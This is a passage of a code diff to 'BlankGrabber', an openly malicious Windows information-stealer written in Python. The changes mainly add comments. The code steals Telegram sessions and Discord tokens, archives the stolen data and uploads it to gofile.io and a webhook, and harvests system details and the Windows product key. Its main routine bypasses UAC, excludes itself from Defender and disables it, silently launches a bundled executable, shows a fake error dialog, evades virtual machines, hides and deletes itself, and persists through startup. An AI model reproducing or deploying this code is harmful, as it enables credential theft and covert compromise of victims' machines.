             tempCam = os.path.join(os.getenv('temp'), 'Camera.exe')
         with open(tempCam, 'wb') as file:
@@ -1178,7 +1185,7 @@ class BlankGrabber:
         os.remove(tempCam)
     
     @Errors.Catch
-    def StealTelegramSessions(self) -> None:
+    def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
         if Settings.CaptureTelegram:
 
             telegramPaths = []
@@ -1235,7 +1242,7 @@ class BlankGrabber:
                 self.TelegramSessions += int((len(loginPaths) - 1)/2)
     
     @Errors.Catch
-    def StealDiscordTokens(self) -> None:
+    def StealDiscordTokens(self) -> None: # Steals Discord tokens
         if Settings.CaptureDiscordTokens:
             output = list()
             saveToDir = os.path.join(self.TempFolder, "Messenger", "Discord")
@@ -1266,8 +1273,9 @@ class BlankGrabber:
                                     DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                     subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
-    def CreateArchive(self) -> tuple[str, str | None]:
-        if Utility.GetSelf()[1]:
+    def CreateArchive(self) -> tuple[str, str | None]: # Create archive of the data collected
+        rarPath = os.path.join(sys._MEIPASS, "rar.exe")
+        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
             if os.path.isfile(rarPath):
                 password = "blank"
@@ -1275,10 +1283,10 @@ class BlankGrabber:
                 if process.returncode == 0:
                     return ("rar", password)
         
-        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder)
+        shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder) # Creates simple unprotected zip file if the above process fails
         return ("zip", None)
 
-    def GenerateTree(self) -> None:
+    def GenerateTree(self) -> None: # Generates tree of the collected data
         if os.path.isdir(self.TempFolder):
             try:
                 contents = "\n".join(Utility.Tree((self.TempFolder, "Stolen Data")))
@@ -1287,14 +1295,14 @@ class BlankGrabber:
             except Exception:
                 pass
     
-    def UploadToGofile(self, path, filename= None) -> str | None:
+    def UploadToGofile(self, path, filename= None) -> str | None: # Uploads a file to gofile.io
         if os.path.isfile(path):
             with open(path, "rb") as file:
                 fileBytes = file.read()
 
             if filename is None:
                 filename = os.path.basename(path)
-            http = PoolManager()
+            http = PoolManager(timeout= 10.0)
 
             try:
                 server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode())["data"]["server"]
@@ -1305,7 +1313,7 @@ class BlankGrabber:
             except Exception:
                 pass
 
-    def SendData(self) -> None:
+    def SendData(self) -> None: # Sends data to the webhook
         extention, password = self.CreateArchive()
         if (self.Cookies or self.Passwords or self.RobloxCookies or self.DiscordTokens or self.MinecraftSessions) and os.path.isfile(self.ArchivePath):
             computerName = os.getenv("computername")
@@ -1316,7 +1324,7 @@ class BlankGrabber:
             gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
             productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
-            http = PoolManager()
+            http = PoolManager(timeout= 10.0)
 
             try:
                 r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
@@ -1392,56 +1400,61 @@ class BlankGrabber:
 
 if __name__ == "__main__" and os.name == "nt":
 
-    if not Utility.IsAdmin() and Utility.GetSelf()[1] and not "--nouacbypass" in sys.argv:
-        Utility.UACbypass()
+    if Utility.GetSelf()[1] and not Utility.IsAdmin() and not "--nouacbypass" in sys.argv:
+        Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
     
-    Utility.ExcludeFromDefender()
-    Utility.DisableDefender()
+    if Utility.GetSelf()[1]: 
+        Utility.ExcludeFromDefender() # Tries to exclude from Defender (only for exe mode)
 
-    if not Utility.IsInStartup() and Utility.GetSelf()[1] and os.path.isfile(os.path.join(sys._MEIPASS, "bound.exe")):
+    Utility.DisableDefender() # Tries to disable Defender
+
+    if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(os.path.join(sys._MEIPASS, "bound.exe")):
         try:
-            if os.path.isfile(boundfile:= os.path.join(os.getenv("temp"), "bound.exe")):
-                os.remove(boundfile)
-            shutil.copy(os.path.join(sys._MEIPASS, "bound.exe"), boundfile)
-            Utility.ExcludeFromDefender(boundfile)
-            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundfile), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            if os.path.isfile(boundfile:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
+                os.remove(boundfile) # Removes any older bound file
+            shutil.copy(os.path.join(sys._MEIPASS, "bound.exe"), boundfile) # Copies bound file to the new location
+            Utility.ExcludeFromDefender(boundfile) # Tries to exclude the bound file from Defender
+            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundfile), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Starts the bound file
         except Exception:
             pass
     
-    if Settings.FakeError[0] and not Utility.IsInStartup():
+    if Utility.GetSelf()[1] and Settings.FakeError[0] and not Utility.IsInStartup(): # If not in startup, check if fake error is defined (exe mode)
         try:
-            title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22")
-            message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22")
-            icon = int(Settings.FakeError[1][2])
-            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, Settings.FakeError[1][2])
-            subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
+            message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
+            icon = int(Settings.FakeError[1][2]) # Sets the icon of the fake error
+            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, Settings.FakeError[1][2]) # Shows a message box using JScript
+            subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Shows the fake error
         except Exception:
             pass
     
-    if Settings.Vmprotect and VmProtect.isVM():
-        os._exit(1)
+    if not Settings.Vmprotect or not VmProtect.isVM():
+        if Utility.GetSelf()[1]:
+            if Settings.Melt and not Utility.IsInStartup(): # If not in startup and melt option is enabled then temporarily hide the file (exe mode)
+                Utility.HideSelf() # Hide the file
+        else:
+            if Settings.Melt: # If melt mode is enabled then delete the file
+                Utility.DeleteSelf() # Delete the file
     
-    if Settings.Melt and not Utility.IsInStartup():
-        Utility.HideSelf()
-    
-    try:
-        if Settings.Startup and not Utility.IsInStartup():
-            path = Utility.PutInStartup()
-            if path is not None:
-                Utility.ExcludeFromDefender(path)
-    except Exception:
-        pass
-    
-    while True:
         try:
-            if Utility.IsConnectedToInternet():
-                BlankGrabber()
-                break
-            else:
-                time.sleep(10)
-        except Exception as e:
-            print("Main Error: " + str(e))
-            time.sleep(600)
-    
-    if Settings.Melt and not Utility.IsInStartup():
-        Utility.DeleteSelf()
+            if Utility.GetSelf()[1] and Settings.Startup and not Utility.IsInStartup(): # If startup option is enabled, and the file is not in the startup, then put it in startup
+                path = Utility.PutInStartup() # Put the file in startup
+                if path is not None:
+                    Utility.ExcludeFromDefender(path) # Exclude the file from defender
+        except Exception:
+            pass
+        
+        while True:
+            try:
+                if Utility.IsConnectedToInternet(): # Check if internet connection is available
+                    BlankGrabber() # Start the grabber
+                    break
+                else:
+                    time.sleep(10) # Wait for 10 seconds and check the internet connection again
+            except Exception as e:
+                if Utility.GetSelf()[1]:
+                    print("Main Error: " + str(e)) # Print the error message (exe mode)
+                time.sleep(600) # Wait for 10 minutes and try again
+        
+        if Utility.GetSelf()[1] and Settings.Melt and not Utility.IsInStartup(): # Delete the file if melt option is enabled and the file is not in the startup (exe mode)
+            Utility.DeleteSelf() # Delete the current file
